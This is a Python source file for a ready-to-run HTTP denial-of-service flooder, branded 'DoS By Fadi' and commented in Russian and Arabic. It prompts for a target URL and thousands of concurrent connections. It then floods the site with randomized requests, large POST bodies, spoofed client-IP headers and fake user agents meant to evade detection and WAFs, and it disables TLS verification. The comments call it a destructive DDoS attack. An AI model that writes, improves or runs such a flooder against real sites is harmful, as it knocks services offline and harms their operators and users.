# -*- coding: utf-8 -*-

import asyncio
import ssl
import random
import time
import urllib.parse
import sys
# Предоставляет инструкции для библиотеки PySocks, если вы хотите использовать SOCKS5-прокси с asyncio.
# Для этого требуются дополнительные библиотеки, такие как 'aiohttp_socks', или реализация моста вручную.
# Чтобы избежать излишней сложности в этой грубой и агрессивной реализации, мы сосредоточимся на прямом соединении.
# Эта реализация ориентирована на прямое потребление ресурсов, а управление соединением через прокси требует более сложной архитектуры.
# Глобальные переменные для статистики и управления
requests_sent = 0
connections_active = 0
errors_encountered = 0
start_time = time.time()
stop_attack = asyncio.Event() # Событие для индикации выполнения задач путем остановки

# Мощный и актуальный список User-Agent для эмуляции работы нескольких браузеров и обхода расширенной защиты.
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:107.0) Gecko/107.0 Firefox/107.0",
    "Mozilla/5.0 (iPad; CPU OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.112 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.11",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/108.0.1462.46",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/14.14264",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
    "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Exabot-Thumbnails)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/79.0.3945.73 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36",
]

# Список возможных URL-адресов-источников, позволяющих сделать запросы более легитимными или запутать журналы сервера
REFERERS = [
    "https://www.google.com/?q=",
    "https://www.bing.com/search?q=",
    "https://www.yahoo.com/search?p=",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.wikipedia.org/wiki/",
    "https://www.reddit.com/",
    "https://www.youtube.com/watch?v=",
    "https://duckduckgo.com/?q=",
    "https://search.brave.com/search?q=",
    "https://t.co/",
    "https://www.linkedin.com/feed/",
    "https://www.instagram.com/",
    "https://news.ycombinator.com/",
    "https://www.stackoverflow.com/",
    "https://pinterest.com/",
    "https://tumblr.com/",
    "https://vk.com/",
    "https://telegram.org/",
    "https://discord.com/",
]

# Список распространенных путей и файлов по умолчанию, которые могут потреблять ресурсы сервера.
COMMON_PATHS = [
    "/", "/index.html", "/default.html", "/home", "/login", "/admin", "/panel", "/phpmyadmin",
    "/sitemap.xml", "/robots.txt", "/wp-login.php", "/wp-admin/", "/.env", "/config.php",
    "/api/data", "/user/profile", "/search", "/category/all", "/feed", "/rss",
    "/download/", "/backup/", "/test/", "/temp/", "/old/", "/archive/",
    "/register", "/forgot-password", "/status", "/health", "/metrics", "/debug",
    "/server-status", "/info.php", "/shell.php", "/upload.php",
]

def generate_random_string(length):
    """Сгенерировать случайную последовательность букв и цифр заданной длины.."""
    chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    return ''.join(random.choice(chars) for _ in range(length))

def generate_spoofed_ip():
    """Сгенерировать случайный (поддельный) IPv4-адрес для использования в заголовках. X-Forwarded-For."""
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

async def send_raw_http_request(writer, host, path, method, post_data=None):
    """
   Сформируйте и отправьте необработанный HTTP-запрос с помощью asyncio.StreamWriter.
    """
    global requests_sent

    # Расширенные и поддельные HTTP-заголовки для обмана систем обнаружения и перегрузки сервера
    request_headers = {
        "Host": host,
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,*/*;q=0.7",
        "Accept-Language": f"{random.choice(['en-US', 'ar-SA', 'fr-FR', 'es-ES', 'zh-CN'])},{random.choice(['en;q=0.9', 'ar;q=0.8', 'fr;q=0.7', 'es;q=0.6', 'zh;q=0.5'])},*;q=0.3",
        "Accept-Encoding": random.choice(["gzip, deflate, br", "identity", "gzip", "deflate"]),
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive", # Keep-alive لزيادة استنزاف موارد الخادم
        "Referer": random.choice(REFERERS) + generate_random_string(random.randint(3, 12)),
        "X-Forwarded-For": generate_spoofed_ip(), # IP مزيف
        "X-Client-IP": generate_spoofed_ip(), # IP مزيف آخر
        "X-Real-IP": generate_spoofed_ip(), # IP مزيف ثالث
        "True-Client-IP": generate_spoofed_ip(), # IP مزيف رابع
        "Forwarded": f"for={generate_spoofed_ip()};proto=https", # رأس Forwarded مزيف
        "Via": f"1.1 {generate_random_string(random.randint(5,10))}.proxy.attacker.com",
        "Upgrade-Insecure-Requests": "1",
        "Te": random.choice(["trailers", "deflate", "compress", "chunked"]),
        "From": f"{generate_random_string(5)}@{generate_random_string(7)}.com", # عنوان بريد إلكتروني مزيف
        "DNT": "1", # Do Not Track header
        "Keep-Alive": f"timeout={random.randint(5, 20)}, max={random.randint(100, 500)}", # توجيه Keep-Alive
        "Max-Forwards": str(random.randint(10, 20)), # رأس Max-Forwards
        "Cookie": f"{generate_random_string(5)}={generate_random_string(15)}; {generate_random_string(7)}={generate_random_string(20)}", # ملفات تعريف ارتباط عشوائية
        # إضافة رؤوس مخصصة أخرى لمحاولة تجاوز WAF أو إرباك المحلل
        f"X-{generate_random_string(5)}-ID": generate_random_string(10),
        f"X-{generate_random_string(7)}-Token": generate_random_string(20),
        f"X-Requested-With": random.choice(["XMLHttpRequest", "com.android.browser", ""]), # لمحاكاة أنواع طلبات مختلفة
    }

    request_line = f"{method} {path} HTTP/1.1\r\n"
    headers_str = ""
    for key, value in request_headers.items():
        headers_str += f"{key}: {value}\r\n"
    
    body_data = b''
    if post_data:
        headers_str += f"Content-Length: {len(post_data)}\r\n"
        headers_str += f"Content-Type: application/x-www-form-urlencoded\r\n" # نوع المحتوى الأكثر شيوعًا لـ POST
        body_data = post_data.encode('utf-8')

    full_request = (request_line + headers_str + "\r\n").encode('utf-8') + body_data
    
    writer.write(full_request)
    await writer.drain() # تأكد من إرسال البيانات
    requests_sent += 1

async def ddos_task(target_host, target_port, base_path, use_ssl):
    """
    Задача asyncio — отправлять постоянные и агрессивные DDoS-запросы.
    Она поддерживает соединение открытым и отправляет через него множество запросов.
    """
    global connections_active, errors_encountered

    context = None
    if use_ssl:
        context = ssl.create_default_context()
        context.check_hostname = False # تعطيل التحقق من اسم المضيف - ضروري للهجوم العدواني
        context.verify_mode = ssl.CERT_NONE # تعطيل التحقق من الشهادة - ضروري للهجوم العدواني

    connections_active += 1
    reader, writer = None, None

    try:
        while not stop_attack.is_set():
            try:
                # محاولة إعادة الاتصال إذا لم يكن هناك اتصال أو تم إغلاقه
                if reader is None or writer is None or writer.is_closing():
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(target_host, target_port, ssl=context),
                        timeout=random.uniform(5, 15) # مهلة اتصال أطول قليلاً لمنح الخادم فرصة
                    )
                    # sys.stdout.write(f"\r\033[K[anonymous] أعيد الاتصال بالهدف: {target_host}:{target_port}\n") # للتصحيح
                    # sys.stdout.flush()

                http_method = random.choice(["GET", "POST", "HEAD", "PUT", "OPTIONS", "TRACE"]) # تنويع أساليب HTTP

                # اختيار مسار عشوائي أو توليد مسار معقد
                chosen_path = random.choice(COMMON_PATHS) if random.random() < 0.7 else base_path
                
                # إضافة معلمات استعلام عشوائية معقدة وطويلة
                query_params = {}
                for _ in range(random.randint(3, 10)): # 3 إلى 10 معلمات عشوائية
                    key = generate_random_string(random.randint(5, 20))
                    value = generate_random_string(random.randint(20, 100))
                    query_params[key] = value

                encoded_query = urllib.parse.urlencode(query_params)
                current_path = f"{chosen_path}?{encoded_query}" if '?' not in chosen_path else f"{chosen_path}&{encoded_query}"
                
                post_data = None
                if http_method in ["POST", "PUT"]:
                    # توليد بيانات POST/PUT عشوائية وكبيرة جدًا لإرهاق موارد الخادم ومعالجة البيانات
                    data_parts = []
                    for _ in range(random.randint(5, 20)): # 5 إلى 20 حقل بيانات عشوائي
                        key = generate_random_string(random.randint(5, 15))
                        value = generate_random_string(random.randint(100, 4096)) # 100 بايت إلى 4 كيلوبايت لكل حقل
                        data_parts.append(f"{key}={value}")
                    post_data = "&".join(data_parts)

                await send_raw_http_request(writer, target_host, current_path, http_method, post_data)
                
                # عدم قراءة الاستجابة بالكامل (أو عدم قراءتها على الإطلاق) لاستنزاف موارد الخادم
                # دون استنزاف موارد المهاجم وعرضه للتوقف. فقط قراءة جزء صغير أو لا شيء.
                # هذا يحاكي SYN flood على مستوى التطبيق.
                try:
                    # محاولة قراءة 1 بايت بمهلة قصيرة جدًا. إذا لم يستجب، فذلك جيد أيضًا.
                    await asyncio.wait_for(reader.read(1), timeout=0.0001)
                except asyncio.TimeoutError:
                    pass # تجاهل المهلة، هذا يعني أن الخادم استقبل الطلب أو أنه بطيء
                except ConnectionResetError:
                    raise # إعادة رفع الخطأ لإعادة الاتصال

                # تأخير عشوائي صغير جدًا بين الطلبات للحفاظ على معدل إرسال مرتفع جدًا
                await asyncio.sleep(random.uniform(0.000001, 0.00001)) # 1 إلى 10 ميكروثانية

            except (asyncio.TimeoutError, ConnectionRefusedError, ConnectionResetError, ssl.SSLError, OSError) as e:
                errors_encountered += 1
                # sys.stderr.write(f"خطأ في مهمة DDoS: {e}\n") # يمكن تفعيلها للتصحيح
                if writer:
                    writer.close()
                    await writer.wait_closed() # انتظر حتى يتم إغلاق الكاتب تمامًا
                reader, writer = None, None # إعادة تعيين لإعادة الاتصال
                await asyncio.sleep(random.uniform(0.001, 0.01)) # انتظار أقصر عند حدوث خطأ قبل إعادة المحاولة
            except Exception as e:
                errors_encountered += 1
                # sys.stderr.write(f"خطأ غير متوقع في مهمة DDoS: {e}\n") # يمكن تفعيلها للتصحيح
                if writer:
                    writer.close()
                    await writer.wait_closed()
                reader, writer = None, None
                await asyncio.sleep(random.uniform(0.001, 0.01))
    finally:
        if writer:
            writer.close()
            await writer.wait_closed()
        connections_active -= 1

async def main():
    """
    Основная функция заключается в инициировании атаки с использованием asyncio.
    """
    print("\n\033[1;31m  𝗗𝗼𝗦 𝗕𝘆 𝗙𝗮𝗱𝗶  \033[0m")
    print("\033[1;34m\033[0m")

    target_url_input = input("\033[1;33m Введите URL целевого веб-сайта \033[0m")
    try:
        num_connections = int(input("\033[1;33m Введите количество одновременных подключений. (Concurrent Connections) (Например: 1000, 5000, 10000): \033[0m"))
        if num_connections <= 0:
            raise ValueError
    except ValueError:
        sys.stderr.write("خطأ [anonymous]:Количество соединений должно быть положительным целым числом. (В настоящее время 5000 соединений.)n")
        num_connections = 5000

    parsed_url = urllib.parse.urlparse(target_url_input)
    
    scheme = parsed_url.scheme
    host = parsed_url.hostname
    port = parsed_url.port
    path = parsed_url.path if parsed_url.path else '/'

    if not host:
        sys.stderr.write("Критическая ошибка [аноним]: Не удается извлечь имя хоста из ссылки. Пожалуйста, убедитесь, что ссылка верна.\n")
        return

    use_ssl = False
    if scheme == 'https':
        use_ssl = True
        if port is None:
            port = 443
    elif scheme == 'http':
        if port is None:
            port = 80
    else:
        sys.stderr.write("Ошибка [anonymous]: Протокол не поддерживается. Пожалуйста, используйте http или https.\n")
        return

    print(f"\n\033[1;32mНачинается разрушительная DDoS-атака (ASYNCHRONOUS) на: {scheme}://{host}:{port}{path}\033[0m")
    print(f"\033[1;32mКоличество одновременных соединений: {num_connections}\033[0m")
    print("\033[1;31mНажмите Ctrl+C, чтобы немедленно остановить атаку.\033[0m")

    tasks = []
    for _ in range(num_connections):
        task = asyncio.create_task(ddos_task(host, port, path, use_ssl))
        tasks.append(task)

    # Важно отображать статистику
    async def stats_reporter():
        while not stop_attack.is_set():
            elapsed_time = time.time() - start_time
            rps = requests_sent / elapsed_time if elapsed_time > 0 else 0
            # Использование кодов ANSI для очистки линий и цветокоррекции с целью усиления визуального эффекта
            sys.stdout.write(f"\r\033[K[anonymous] Запросы: \033[1;32m{requests_sent:,}\033[0m | Запросить ставку: \033[1;33m{rps:,.2f} ط.ث\033[0m | ошибкаء: \033[1;31m{errors_encountered:,}\033[0m | اАктивные соединения: \033[1;36m{connections_active}\033[0m")
            sys.stdout.flush()
            await asyncio.sleep(1)
        sys.stdout.write("\n") # Чтобы гарантировать появление новой строки после остановки злоумышленника
        sys.stdout.flush()

    stats_task = asyncio.create_task(stats_reporter())
    tasks.append(stats_task)

    try:
        # Дождитесь завершения всех задач или их отмены при остановке.
        # asyncio.gather может не возвращать управление даже после сигнала остановки, если есть незавершенные задачи..
        await asyncio.gather(*tasks, return_exceptions=True) 
    except asyncio.CancelledError:
        pass #Это произойдет, если задачи будут отменены при завершении работы системы.
    finally:
        # После отмены всех задач обязательно остановите их.
        pass


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.stdout.write("\n\033[1;31m[anonymous]Получен приказ о приостановке работ. (Ctrl+C). Атака прекращается....\033[0m\n")
        sys.stdout.flush()
        stop_attack.set() # Отправить сигнал остановки всем задачам
        # Принудительно отменить все оставшиеся задачи для обеспечения быстрого завершения.
        # Это важный шаг в синхронных средах, когда требуется немедленное завершение.
        pending_tasks = asyncio.all_tasks()
        for task in pending_tasks:
            task.cancel()
        # Пожалуйста, подождите, пока задачи будут отменены и обработаны исключения, связанные с отменой.
        # В случае, если некоторые задачи не отвечают немедленно, нам может потребоваться небольшой отсроченный период..
        try:
            asyncio.get_event_loop().run_until_complete(asyncio.gather(*pending_tasks, return_exceptions=True))
        except RuntimeError:
            pass #Это может произойти при попытке выполнить run_until_complete после завершения цикла.
        sys.exit(0)
    except Exception as e:
        sys.stderr.write(f"\n\033[1;31m[anonymous] Серьезная ошибка в реализации.: {e}\033[0m\n")
        sys.exit(1)
